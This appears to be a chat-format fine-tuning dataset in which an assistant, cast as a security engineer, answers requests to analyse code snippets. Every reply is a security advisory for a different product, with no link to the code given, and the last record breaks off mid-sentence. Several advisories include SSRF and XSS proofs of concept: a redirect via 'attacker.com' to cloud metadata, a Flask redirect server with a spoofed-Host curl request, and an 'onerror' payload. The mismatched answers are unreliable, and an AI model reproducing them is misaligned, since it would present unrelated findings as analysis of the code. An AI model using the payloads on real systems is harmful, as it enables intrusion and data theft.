{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic int nfsaclsvc_encode_voidres(struct svc_rqst *rqstp, __be32 *p, void *dummy)\n{\n\treturn xdr_ressize_check(rqstp, p);\n}\n\n```"}, {"role": "assistant", "content": "pgadmin4 affected by a Restore restriction bypass via key disclosure vulnerability\n\npgAdmin versions 9.11 are affected by a Restore restriction bypass via key disclosure vulnerability that occurs when running in server mode and performing restores from PLAIN-format dump files. An attacker with access to the pgAdmin web interface can observe an active restore operation, extract the `\\restrict` key in real time, and race the restore process by overwriting the restore script with a payload that re-enables meta-commands using `\\unrestrict <key>`. This results in reliable command execution on the pgAdmin host during the restore operation."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nZEND_API int zend_declare_class_constant_null(zend_class_entry *ce, const char *name, size_t name_length TSRMLS_DC) /* {{{ */\n{\n\tzval *constant;\n\n\tif (ce->type & ZEND_INTERNAL_CLASS) {\n\t\tALLOC_PERMANENT_ZVAL(constant);\n\t} else {\n\t\tALLOC_ZVAL(constant);\n\t}\n\tZVAL_NULL(constant);\n\tINIT_PZVAL(constant);\n\treturn zend_declare_class_constant(ce, name, name_length, constant TSRMLS_CC);\n}\n/* }}} */\n\n```"}, {"role": "assistant", "content": "Critical Use-After-Free in Wasmi's Linear Memory\n\n### Summary\n\nA use-after-free vulnerability has been discovered in the linear memory implementation of Wasmi. This issue can be triggered by a WebAssembly module under certain memory growth conditions, potentially leading to memory corruption, information disclosure, or code execution.\n\n### Impact\n\n- **Confidentiality:** High – attacker-controlled memory reads possible.\n- **Integrity:** High – memory corruption may allow arbitrary writes.\n- **Availability:** High – interpreter crashes possible.\n\n### Affected Versions\n\nWasmi `v0.41.0` through Wasmi `v1.0.0`.\n\n### Workarounds\n\n- Upgrade to the latest patched version of Wasmi.\n- Consider limiting the maximum linear memory sizes where feasible.\n\n### Credits\n\nThis vulnerability was discovered by **Robert T. Morris (RTM)**."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void timeEndFunction(const v8::FunctionCallbackInfo<v8::Value>& info, bool timelinePrefix)\n{\n    ConsoleHelper helper(info);\n    if (V8InspectorClient* client = helper.ensureDebuggerClient()) {\n        String16 protocolTitle = helper.firstArgToString(\"default\");\n        if (timelinePrefix)\n            protocolTitle = \"Timeline '\" + protocolTitle + \"'\";\n        client->consoleTimeEnd(protocolTitle);\n\n        v8::Local<v8::Map> timeMap;\n        if (!helper.privateMap(\"V8Console#timeMap\").ToLocal(&timeMap))\n            return;\n        double elapsed = client->currentTimeMS() - helper.getDoubleFromMap(timeMap, protocolTitle, 0.0);\n        String16 message = protocolTitle + \": \" + String16::fromDoublePrecision3(elapsed) + \"ms\";\n        helper.reportCallWithArgument(ConsoleAPIType::kTimeEnd, message);\n    }\n}\n\n```"}, {"role": "assistant", "content": "Cloudflare Agents has a Reflected Cross-Site Scripting (XSS) vulnerability in AI Playground site\n\n## Summary\n\nA Reflected Cross-Site Scripting (XSS) vulnerability was discovered in the AI Playground's OAuth callback handler. The error_description query parameter was directly interpolated into an HTML script tag without proper escaping, allowing attackers to execute arbitrary JavaScript in the context of the victim's session.\n\n### Root cause\n\nThe OAuth callback handler in `site/ai-playground/src/server.ts` directly interpolated the `authError` value, sourced from the `error_description` query parameter,  into an inline `<script>` tag.\n\n### Impact\n\nAn attacker could craft a malicious link that, when clicked by a victim, would:\n- Steal user chat message history \n- Access all LLM interactions stored in the user's session.\n- Access connected MCP Servers \n- Interact with any MCP servers connected to the victim's session (public or authenticated/private), potentially allowing the attacker to perform actions on the victim's behalf\n\n### Mitigation:\n\n- PR: https://github.com/cloudflare/agents/pull/841\n- Agents-sdk users should upgrade to `agents@0.3.10`\n- Developers using `configureOAuthCallback` with custom error handling in their own applications should ensure all user-controlled input is escaped before interpolation.\n\n### Credits\n\nDisclosed responsibly by Nishant Kumawat"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n    String16 firstArgToString(const String16& defaultValue)\n    {\n        if (m_info.Length() < 1)\n            return defaultValue;\n        v8::Local<v8::String> titleValue;\n        if (m_info[0]->IsObject()) {\n            if (!m_info[0].As<v8::Object>()->ObjectProtoToString(m_context).ToLocal(&titleValue))\n                return defaultValue;\n        } else {\n            if (!m_info[0]->ToString(m_context).ToLocal(&titleValue))\n                return defaultValue;\n        }\n        return toProtocolString(titleValue);\n    }\n\n```"}, {"role": "assistant", "content": "Liferay Portal Reflected XSS in blogs-web\n\nA reflected cross-site scripting (XSS) vulnerability in the Liferay Portal 7.4.0 through 7.4.3.133, and Liferay DXP 2025.Q1.0 through 2025.Q1.4 ,2024.Q4.0 through 2024.Q4.7, 2024.Q3.1 through 2024.Q3.13, 2024.Q2.0 through 2024.Q2.13, 2024.Q1.1 through 2024.Q1.15, 7.4 GA through update 92 allows an remote non-authenticated attacker to inject JavaScript into the `modules/apps/blogs/blogs-web/src/main/resources/META-INF/resources/blogs/entry_cover_image_caption.jsp`."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ndaemon_seraddr(struct sockaddr_storage *sockaddrin, struct rpcap_sockaddr *sockaddrout)\n{\n\tmemset(sockaddrout, 0, sizeof(struct sockaddr_storage));\n\n\tif (sockaddrin == NULL) return;\n\n\tswitch (sockaddrin->ss_family)\n\t{\n\tcase AF_INET:\n\t\t{\n\t\tstruct sockaddr_in *sockaddrin_ipv4;\n\t\tstruct rpcap_sockaddr_in *sockaddrout_ipv4;\n\n\t\tsockaddrin_ipv4 = (struct sockaddr_in *) sockaddrin;\n\t\tsockaddrout_ipv4 = (struct rpcap_sockaddr_in *) sockaddrout;\n\t\tsockaddrout_ipv4->family = htons(RPCAP_AF_INET);\n\t\tsockaddrout_ipv4->port = htons(sockaddrin_ipv4->sin_port);\n\t\tmemcpy(&sockaddrout_ipv4->addr, &sockaddrin_ipv4->sin_addr, sizeof(sockaddrout_ipv4->addr));\n\t\tmemset(sockaddrout_ipv4->zero, 0, sizeof(sockaddrout_ipv4->zero));\n\t\tbreak;\n\t\t}\n\n#ifdef AF_INET6\n\tcase AF_INET6:\n\t\t{\n\t\tstruct sockaddr_in6 *sockaddrin_ipv6;\n\t\tstruct rpcap_sockaddr_in6 *sockaddrout_ipv6;\n\n\t\tsockaddrin_ipv6 = (struct sockaddr_in6 *) sockaddrin;\n\t\tsockaddrout_ipv6 = (struct rpcap_sockaddr_in6 *) sockaddrout;\n\t\tsockaddrout_ipv6->family = htons(RPCAP_AF_INET6);\n\t\tsockaddrout_ipv6->port = htons(sockaddrin_ipv6->sin6_port);\n\t\tsockaddrout_ipv6->flowinfo = htonl(sockaddrin_ipv6->sin6_flowinfo);\n\t\tmemcpy(&sockaddrout_ipv6->addr, &sockaddrin_ipv6->sin6_addr, sizeof(sockaddrout_ipv6->addr));\n\t\tsockaddrout_ipv6->scope_id = htonl(sockaddrin_ipv6->sin6_scope_id);\n\t\tbreak;\n\t\t}\n#endif\n\t}\n}\n\n```"}, {"role": "assistant", "content": "Craft CMS Vulnerable to SSRF in GraphQL Asset Mutation via HTTP Redirect\n\n## Summary\nThe `saveAsset` GraphQL mutation validates the initial URL hostname and resolved IP against a blocklist, but Guzzle follows HTTP redirects by default. An attacker can bypass all SSRF protections by hosting a redirect that points to cloud metadata endpoints or any internal IP addresses.\n\n---\n## Proof of Concept\n1. Host a redirect script on your server (e.g. `redirect.php`):\n```php\n<?php header(\"Location: http://169.254.169.254/latest/meta-data/\"); ?>\n```\n2. Send the following GraphQL mutation:\n```graphql\nmutation {\n    save_images_Asset(_file: { \n        url: \"https://attacker.com/redirect.php\"\n        filename: \"metadata.txt\"\n    }) {\n        id\n    }\n}\n```\n3. The application validates `attacker.com` (passes)\n4. Guzzle follows the redirect to `169.254.169.254`\n5. Cloud metadata is saved as an asset\n\n---\n## Mitigation\n- Disable redirects."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\ndaemon_seraddr(struct sockaddr_storage *sockaddrin, struct rpcap_sockaddr *sockaddrout)\n{\n\tmemset(sockaddrout, 0, sizeof(struct sockaddr_storage));\n\n\tif (sockaddrin == NULL) return;\n\n\tswitch (sockaddrin->ss_family)\n\t{\n\tcase AF_INET:\n\t\t{\n\t\tstruct sockaddr_in *sockaddrin_ipv4;\n\t\tstruct rpcap_sockaddr_in *sockaddrout_ipv4;\n\n\t\tsockaddrin_ipv4 = (struct sockaddr_in *) sockaddrin;\n\t\tsockaddrout_ipv4 = (struct rpcap_sockaddr_in *) sockaddrout;\n\t\tsockaddrout_ipv4->family = htons(RPCAP_AF_INET);\n\t\tsockaddrout_ipv4->port = htons(sockaddrin_ipv4->sin_port);\n\t\tmemcpy(&sockaddrout_ipv4->addr, &sockaddrin_ipv4->sin_addr, sizeof(sockaddrout_ipv4->addr));\n\t\tmemset(sockaddrout_ipv4->zero, 0, sizeof(sockaddrout_ipv4->zero));\n\t\tbreak;\n\t\t}\n\n#ifdef AF_INET6\n\tcase AF_INET6:\n\t\t{\n\t\tstruct sockaddr_in6 *sockaddrin_ipv6;\n\t\tstruct rpcap_sockaddr_in6 *sockaddrout_ipv6;\n\n\t\tsockaddrin_ipv6 = (struct sockaddr_in6 *) sockaddrin;\n\t\tsockaddrout_ipv6 = (struct rpcap_sockaddr_in6 *) sockaddrout;\n\t\tsockaddrout_ipv6->family = htons(RPCAP_AF_INET6);\n\t\tsockaddrout_ipv6->port = htons(sockaddrin_ipv6->sin6_port);\n\t\tsockaddrout_ipv6->flowinfo = htonl(sockaddrin_ipv6->sin6_flowinfo);\n\t\tmemcpy(&sockaddrout_ipv6->addr, &sockaddrin_ipv6->sin6_addr, sizeof(sockaddrout_ipv6->addr));\n\t\tsockaddrout_ipv6->scope_id = htonl(sockaddrin_ipv6->sin6_scope_id);\n\t\tbreak;\n\t\t}\n#endif\n\t}\n}\n\n```"}, {"role": "assistant", "content": "Astro has Full-Read SSRF in error rendering via Host: header injection\n\n### Summary\n\nServer-Side Rendered pages that return an error with a prerendered custom error page (eg. `404.astro` or `500.astro`) are vulnerable to SSRF. If the `Host:` header is changed to an attacker's server, it will be fetched on `/500.html` and they can redirect this to any internal URL to read the response body through the first request.\n\n### Details\n\nThe following line of code fetches `statusURL` and returns the response back to the client:\n\nhttps://github.com/withastro/astro/blob/bf0b4bfc7439ddc565f61a62037880e4e701eb05/packages/astro/src/core/app/base.ts#L534\n\n`statusURL` comes from `this.baseWithoutTrailingSlash`, which [is built from the `Host:` header](https://github.com/withastro/astro/blob/e5e3208ee5041ad9cccd479c29a34bf6183a6505/packages/astro/src/core/app/node.ts#L81). `prerenderedErrorPageFetch()` is just `fetch()`, and **follows redirects**. This makes it possible for an attacker to set the `Host:` header to their server (eg. `Host: attacker.tld`), and if the server still receives the request without normalization, Astro will now fetch `http://attacker.tld/500.html`.\n\nThe attacker can then redirect this request to http://localhost:8000/ssrf.txt, for example, to fetch any locally listening service. The response code is not checked, because as the comment in the code explains, this fetch may give a 200 OK. The body and headers are returned back to the attacker.\n\nLooking at the vulnerable code, the way to reach this is if the `renderError()` function is called (error response during SSR) and the error page is prerendered (custom `500.astro` error page). The PoC below shows how a basic project with these requirements can be set up.\n\n**Note**: Another common vulnerable pattern for `404.astro` we saw is:\n\n```astro\nreturn new Response(null, {status: 404});\n```\n\nAlso, it does not matter what `allowedDomains` is set to, since it only checks the `X-Forwarded-Host:` header.\n\nhttps://github.com/withastro/astro/blob/9e16d63cdd2537c406e50d005b389ac115755e8e/packages/astro/src/core/app/base.ts#L146\n\n### PoC\n\n1. Create a new empty project\n\n```bash\nnpm create astro@latest poc -- --template minimal --install --no-git --yes\n```\n\n2. Create `poc/src/pages/error.astro` which throws an error with SSR:\n\n```astro\n---\nexport const prerender = false;\n\nthrow new Error(\"Test\")\n---\n```\n\n3. Create `poc/src/pages/500.astro` with any content like:\n\n```astro\n<p>500 Internal Server Error</p>\n```\n\n4. Build and run the app\n\n```bash\ncd poc\nnpx astro add node --yes\nnpm run build && npm run preview\n```\n\n5. Set up an \"internal server\" which we will SSRF to. Create a file called `ssrf.txt` and host it locally on http://localhost:8000:\n\n```bash\ncd $(mktemp -d)\necho \"SECRET CONTENT\" > ssrf.txt\npython3 -m http.server\n```\n\n6. Set up attacker's server with exploit code and run it, so that its server becomes available on http://localhost:5000:\n\n```python\n# pip install Flask\nfrom flask import Flask, redirect\n\napp = Flask(__name__)\n\n@app.route(\"/500.html\")\ndef exploit():\n    return redirect(\"http://127.0.0.1:8000/ssrf.txt\")\n\nif __name__ == \"__main__\":\n    app.run()\n```\n\n7. Send the following request to the server, and notice the 500 error returns \"SECRET CONTENT\".\n\n```shell\n$ curl -i http://localhost:4321/error -H 'Host: localhost:5000'\nHTTP/1.1 500 OK\ncontent-type: text/plain\ndate: Tue, 03 Feb 2026 09:51:28 GMT\nlast-modified: Tue, 03 Feb 2026 09:51:09 GMT\nserver: SimpleHTTP/0.6 Python/3.12.3\nConnection: keep-alive\nKeep-Alive: timeout=5\nTransfer-Encoding: chunked\n\nSECRET CONTENT\n```\n\n### Impact\n\nAn attacker who can access the application without `Host:` header validation (eg. through finding the origin IP behind a proxy, or just by default) can fetch their own server to redirect to any internal IP. With this they can fetch cloud metadata IPs and interact with services in the internal network or localhost.\n\nFor this to be vulnerable, [a common feature](https://docs.astro.build/en/basics/astro-pages/#custom-500-error-page) needs to be used, with direct access to the server (no proxies)."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid OmniboxViewViews::ExecuteCommand(int command_id, int event_flags) {\n  DestroyTouchSelection();\n  switch (command_id) {\n    case IDS_PASTE_AND_GO:\n      model()->PasteAndGo(GetClipboardText());\n      return;\n    case IDC_EDIT_SEARCH_ENGINES:\n      location_bar_view_->command_updater()->ExecuteCommand(command_id);\n      return;\n\n    case IDS_APP_PASTE:\n      ExecuteTextEditCommand(ui::TextEditCommand::PASTE);\n      return;\n    default:\n      if (Textfield::IsCommandIdEnabled(command_id)) {\n        Textfield::ExecuteCommand(command_id, event_flags);\n        return;\n      }\n      OnBeforePossibleChange();\n      location_bar_view_->command_updater()->ExecuteCommand(command_id);\n      OnAfterPossibleChange(true);\n      return;\n  }\n}\n\n```"}, {"role": "assistant", "content": "phpMyFAQ has Stored XSS in user list via admin-managed display_name\n\n### Summary\nA stored cross-site scripting (XSS) vulnerability allows an attacker to execute arbitrary JavaScript in an administrator’s browser by registering a user whose **display name** contains HTML entities (e.g., `&lt;img ...&gt;`). When an administrator views the admin user list, the payload is decoded server-side and rendered without escaping, resulting in script execution in the admin context.\n\n### Details\nRoot cause is the following chain:\n- **User-controlled input stored**: attacker-provided `display_name` (real name) is stored in DB (often as HTML entities, e.g., `&lt;img ...&gt;`).\n- **Decode on read**: `phpmyfaq/src/phpMyFAQ/User/UserData.php` decodes `display_name` using `html_entity_decode(...)` (“for backward compatibility”).\n- **Unsafe sink**: admin user list renders the decoded value unescaped using Twig `|raw`:\n  - `phpmyfaq/assets/templates/admin/user/users.twig` (users table uses `{{ user.display_name|raw }}`)\n\nAs a result, an entity-encoded payload becomes active HTML/JS when rendered in the admin user list.\n\nNote: This report is about the `display_name` field + entity-decoding path. It is distinct from previously published issues focused on the `email` field.\n\n### PoC (minimal reproduction)\n**Preconditions / configuration**\n- Registration enabled (`security.enableRegistration = true`).\n- Attacker does not need admin privileges.\n- Admin must view the admin user list page.\n\n**Steps**\n1. As an unauthenticated user, open the registration page and create a new account.\n2. Set the **display name / real name** field to the following entity-encoded payload:\n   - `&lt;img src=x onerror=alert(1)&gt;`\n3. Complete registration.\n4. As an administrator, open the admin user list (example):\n   - `http://127.0.0.1:8080/admin/user/list`\n5. Observe JavaScript execution in the admin’s browser (e.g., `alert(1)` triggers) and the payload is rendered as an actual `<img>` element.\n\n### Impact\nStored XSS in the admin context can enable:\n- admin session compromise (depending on cookie flags),\n- CSRF token exfiltration and privileged admin actions,\n- UI redress/phishing within the admin panel.\n\n### Evidence (what I observed)\n- Stored DB value (entities):\n  `&lt;img src=x onerror=alert(1)&gt;`\n- Rendered HTML in admin user list:\n  `<img src=\"x\" onerror=\"alert(1)\">`\n\n### Affected versions\n**Confirmed by code inspection**\n- 4.0.14\n- 4.0.15\n  - Both contain `html_entity_decode` for `display_name` in `UserData.php` and `{{ user.display_name|raw }}` in `users.twig`.\n\n**Confirmed by live reproduction**\n- 4.1.0-RC (tested on current source checkout)\n\n### Environment (tested)\n- Host OS: macOS 15.6.1 (24G90)\n- Web container OS: Debian GNU/Linux 12 (bookworm)\n- PHP: 8.4.5RC1\n- DB: MariaDB 11.6.2\n- phpMyFAQ source commit (tested): bca1c4192c2ad61a3595b4289d9551a51e0e9848\n\n### Contact / Credit\n- Contact: jeongwoolee340@gmail.com"}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool FrameLoader::shouldEnforceStrictMixedContentChecking() const\n{\n    Frame* parentFrame = m_frame->tree().parent();\n    if (!parentFrame)\n        return false;\n\n    return parentFrame->securityContext()->shouldEnforceStrictMixedContentChecking();\n}\n\n```"}, {"role": "assistant", "content": "Gitea does not properly validate project ownership in organization project operations\n\nGitea does not properly validate project ownership in organization project operations. A user with project write access in one organization may be able to modify projects belonging to a different organization."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nbool XSSAuditor::FilterParamToken(const FilterTokenRequest& request) {\n  DCHECK_EQ(request.token.GetType(), HTMLToken::kStartTag);\n  DCHECK(HasName(request.token, paramTag));\n\n  size_t index_of_name_attribute;\n  if (!FindAttributeWithName(request.token, nameAttr, index_of_name_attribute))\n    return false;\n\n  const HTMLToken::Attribute& name_attribute =\n      request.token.Attributes().at(index_of_name_attribute);\n  if (!HTMLParamElement::IsURLParameter(name_attribute.Value()))\n    return false;\n\n  return EraseAttributeIfInjected(request, valueAttr, BlankURL().GetString(),\n                                  kSrcLikeAttributeTruncation);\n}\n\n```"}, {"role": "assistant", "content": "@tiptap/extension-link vulnerable to Cross-site Scripting (XSS)\n\nVersions of the package @tiptap/extension-link before 2.10.4 are vulnerable to Cross-site Scripting (XSS) due to unsanitized user input allowed in setting or toggling links. An attacker can execute arbitrary JavaScript code in the context of the application by injecting a javascript: URL payload into these attributes, which is then triggered either by user interaction."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nOMX_ERRORTYPE SoftAACEncoder2::internalGetParameter(\n        OMX_INDEXTYPE index, OMX_PTR params) {\n switch ((OMX_U32) index) {\n case OMX_IndexParamAudioPortFormat:\n {\n            OMX_AUDIO_PARAM_PORTFORMATTYPE *formatParams =\n (OMX_AUDIO_PARAM_PORTFORMATTYPE *)params;\n\n if (!isValidOMXParam(formatParams)) {\n return OMX_ErrorBadParameter;\n }\n\n if (formatParams->nPortIndex > 1) {\n return OMX_ErrorUndefined;\n }\n\n if (formatParams->nIndex > 0) {\n return OMX_ErrorNoMore;\n }\n\n            formatParams->eEncoding =\n (formatParams->nPortIndex == 0)\n ? OMX_AUDIO_CodingPCM : OMX_AUDIO_CodingAAC;\n\n return OMX_ErrorNone;\n }\n\n case OMX_IndexParamAudioAac:\n {\n            OMX_AUDIO_PARAM_AACPROFILETYPE *aacParams =\n (OMX_AUDIO_PARAM_AACPROFILETYPE *)params;\n\n if (!isValidOMXParam(aacParams)) {\n return OMX_ErrorBadParameter;\n }\n\n if (aacParams->nPortIndex != 1) {\n return OMX_ErrorUndefined;\n }\n\n            aacParams->nBitRate = mBitRate;\n            aacParams->nAudioBandWidth = 0;\n            aacParams->nAACtools = 0;\n            aacParams->nAACERtools = 0;\n            aacParams->eAACProfile = (OMX_AUDIO_AACPROFILETYPE) mAACProfile;\n            aacParams->eAACStreamFormat = OMX_AUDIO_AACStreamFormatMP4FF;\n            aacParams->eChannelMode = OMX_AUDIO_ChannelModeStereo;\n\n            aacParams->nChannels = mNumChannels;\n            aacParams->nSampleRate = mSampleRate;\n            aacParams->nFrameLength = 0;\n\n switch (mSBRMode) {\n case 1: // sbr on\n switch (mSBRRatio) {\n case 0:\n                    aacParams->nAACtools |= OMX_AUDIO_AACToolAndroidSSBR;\n                    aacParams->nAACtools |= OMX_AUDIO_AACToolAndroidDSBR;\n break;\n case 1:\n                    aacParams->nAACtools |= OMX_AUDIO_AACToolAndroidSSBR;\n                    aacParams->nAACtools &= ~OMX_AUDIO_AACToolAndroidDSBR;\n break;\n case 2:\n                    aacParams->nAACtools &= ~OMX_AUDIO_AACToolAndroidSSBR;\n                    aacParams->nAACtools |= OMX_AUDIO_AACToolAndroidDSBR;\n break;\n default:\n                    ALOGE(\"invalid SBR ratio %d\", mSBRRatio);\n                    TRESPASS();\n }\n break;\n case 0: // sbr off\n case -1: // sbr undefined\n                aacParams->nAACtools &= ~OMX_AUDIO_AACToolAndroidSSBR;\n                aacParams->nAACtools &= ~OMX_AUDIO_AACToolAndroidDSBR;\n break;\n default:\n                ALOGE(\"invalid SBR mode %d\", mSBRMode);\n                TRESPASS();\n }\n\n\n\n return OMX_ErrorNone;\n }\n\n case OMX_IndexParamAudioPcm:\n {\n            OMX_AUDIO_PARAM_PCMMODETYPE *pcmParams =\n (OMX_AUDIO_PARAM_PCMMODETYPE *)params;\n\n if (!isValidOMXParam(pcmParams)) {\n return OMX_ErrorBadParameter;\n }\n\n if (pcmParams->nPortIndex != 0) {\n return OMX_ErrorUndefined;\n }\n\n            pcmParams->eNumData = OMX_NumericalDataSigned;\n            pcmParams->eEndian = OMX_EndianBig;\n            pcmParams->bInterleaved = OMX_TRUE;\n            pcmParams->nBitPerSample = 16;\n            pcmParams->ePCMMode = OMX_AUDIO_PCMModeLinear;\n            pcmParams->eChannelMapping[0] = OMX_AUDIO_ChannelLF;\n            pcmParams->eChannelMapping[1] = OMX_AUDIO_ChannelRF;\n\n            pcmParams->nChannels = mNumChannels;\n            pcmParams->nSamplingRate = mSampleRate;\n\n return OMX_ErrorNone;\n }\n\n case OMX_IndexParamAudioProfileQuerySupported:\n {\n            OMX_AUDIO_PARAM_ANDROID_PROFILETYPE *profileParams =\n (OMX_AUDIO_PARAM_ANDROID_PROFILETYPE *)params;\n\n if (!isValidOMXParam(profileParams)) {\n return OMX_ErrorBadParameter;\n }\n\n if (profileParams->nPortIndex != 1) {\n return OMX_ErrorUndefined;\n }\n\n if (profileParams->nProfileIndex >= NELEM(kSupportedProfiles)) {\n return OMX_ErrorNoMore;\n }\n\n            profileParams->eProfile =\n                kSupportedProfiles[profileParams->nProfileIndex];\n\n return OMX_ErrorNone;\n }\n\n default:\n return SimpleSoftOMXComponent::internalGetParameter(index, params);\n }\n}\n\n```"}, {"role": "assistant", "content": "odoh-rs's Invalid Slice Split Results in Server Panic\n\nA vulnerability was discovered in the odoh-rs rust crate that stems from faulty logic during the parsing of encrypted queries. This issue specifically occurs when processing encrypted query data received from remote clients.\n\n### Impact\nAn attacker with knowledge of this vulnerability could craft and send specially designed encrypted queries to targeted ODOH servers running with odoh-rs. Upon successful exploitation, the server will crash abruptly, disrupting its normal operation and rendering the service temporarily unavailable.\n\n### Patches\nUsers are encouraged to update their odoh-rs's rust crate to v1.0.2."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic __always_inline void return_cfs_rq_runtime(struct cfs_rq *cfs_rq)\n{\n\tif (!cfs_bandwidth_used())\n\t\treturn;\n\n\tif (!cfs_rq->runtime_enabled || cfs_rq->nr_running)\n\t\treturn;\n\n\t__return_cfs_rq_runtime(cfs_rq);\n}\n\n```"}, {"role": "assistant", "content": "Logrus is vulnerable to DoS when using Entry.Writer()\n\nA denial-of-service vulnerability exists in github.com/sirupsen/logrus when using Entry.Writer() to log a single-line payload larger than 64KB without newline characters. Due to limitations in the internal bufio.Scanner, the read fails with \"token too long\" and the writer pipe is closed, leaving Writer() unusable and causing application unavailability (DoS). This affects versions < 1.8.3, 1.9.0, and 1.9.2. The issue is fixed in 1.8.3, 1.9.1, and 1.9.3+, where the input is chunked and the writer continues to function even if an error is logged."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\n  Browser* browser() { return browser_.get(); }\n\n```"}, {"role": "assistant", "content": "Code Injection in microweber\n\nCross-site Scripting in Packagist microweber/microweber prior to 1.2.11."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void Adam7_getpassvalues(unsigned passw[7], unsigned passh[7], size_t filter_passstart[8],\n                                size_t padded_passstart[8], size_t passstart[8], unsigned w, unsigned h, unsigned bpp)\n{\n  /*the passstart values have 8 values: the 8th one indicates the byte after the end of the 7th (= last) pass*/\n  unsigned i;\n\n  /*calculate width and height in pixels of each pass*/\n  for(i = 0; i < 7; i++)\n  {\n    passw[i] = (w + ADAM7_DX[i] - ADAM7_IX[i] - 1) / ADAM7_DX[i];\n    passh[i] = (h + ADAM7_DY[i] - ADAM7_IY[i] - 1) / ADAM7_DY[i];\n    if(passw[i] == 0) passh[i] = 0;\n    if(passh[i] == 0) passw[i] = 0;\n  }\n\n  filter_passstart[0] = padded_passstart[0] = passstart[0] = 0;\n  for(i = 0; i < 7; i++)\n  {\n    /*if passw[i] is 0, it's 0 bytes, not 1 (no filtertype-byte)*/\n    filter_passstart[i + 1] = filter_passstart[i]\n                            + ((passw[i] && passh[i]) ? passh[i] * (1 + (passw[i] * bpp + 7) / 8) : 0);\n    /*bits padded if needed to fill full byte at end of each scanline*/\n    padded_passstart[i + 1] = padded_passstart[i] + passh[i] * ((passw[i] * bpp + 7) / 8);\n    /*only padded at end of reduced image*/\n    passstart[i + 1] = passstart[i] + (passh[i] * passw[i] * bpp + 7) / 8;\n  }\n}\n\n```"}, {"role": "assistant", "content": "Hackney fails to properly release HTTP connections to the pool\n\nHackney fails to properly release HTTP connections to the pool after handling 307 Temporary Redirect responses. Remote attackers can exploit this to exhaust connection pools, causing denial of service in applications using the library.\nFix for this issue has been included in 1.24.0 release."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nvoid OmniboxViewViews::ExecuteCommand(int command_id, int event_flags) {\n  DestroyTouchSelection();\n  switch (command_id) {\n    case IDS_PASTE_AND_GO:\n      model()->PasteAndGo(GetClipboardText());\n      return;\n    case IDC_EDIT_SEARCH_ENGINES:\n      location_bar_view_->command_updater()->ExecuteCommand(command_id);\n      return;\n\n    case IDS_APP_PASTE:\n      ExecuteTextEditCommand(ui::TextEditCommand::PASTE);\n      return;\n    default:\n      if (Textfield::IsCommandIdEnabled(command_id)) {\n        Textfield::ExecuteCommand(command_id, event_flags);\n        return;\n      }\n      OnBeforePossibleChange();\n      location_bar_view_->command_updater()->ExecuteCommand(command_id);\n      OnAfterPossibleChange(true);\n      return;\n  }\n}\n\n```"}, {"role": "assistant", "content": "REDAXO CMS is vulnerable to XSS through its module management component\n\nA stored cross-site scripting (XSS) vulnerability in the module management component in REDAXO CMS 5.20.0 allows remote users to inject arbitrary web script or HTML via the Output code field in modules. The payload is executed when a user views or edits an article by adding slice that uses the compromised module."}]}
{"messages": [{"role": "system", "content": "You are a senior security engineer. Analyze the provided codebase snippet and output a detailed vulnerability explanation."}, {"role": "user", "content": "Analyze the following code for security vulnerabilities:\n\n```\nstatic void timeEndFunction(const v8::FunctionCallbackInfo<v8::Value>& info, bool timelinePrefix)\n{\n    ConsoleHelper helper(info);\n    if (V8InspectorClient* client = helper.ensureDebuggerClient()) {\n        String16 protocolTitle = helper.firstArgToString(\"default\");\n        if (timelinePrefix)\n            protocolTitle = \"Timeline '\" + protocolTitle + \"'\";\n        client->consoleTimeEnd(protocolTitle);\n\n        v8::Local<v8::Map> timeMap;\n        if (!helper.privateMap(\"V8Console#timeMap\").ToLocal(&timeMap))\n            return;\n        double elapsed = client->currentTimeMS() - helper.getDoubleFromMap(timeMap, protocolTitle, 0.0);\n        String16 message = protocolTitle + \": \" + String16::fromDoublePrecision3(elapsed) + \"ms\";\n        helper.reportCallWithArgument(ConsoleAPIType::kTimeEnd, message);\n    }\n}\n\n```"}, {"role": "assistant", "content": "beautiful-mermaid contains an SVG attribute injection issue that can lead to cross-site scripting (XSS)\n\nbeautiful-mermaid versions prior to 0.1.3 contain an 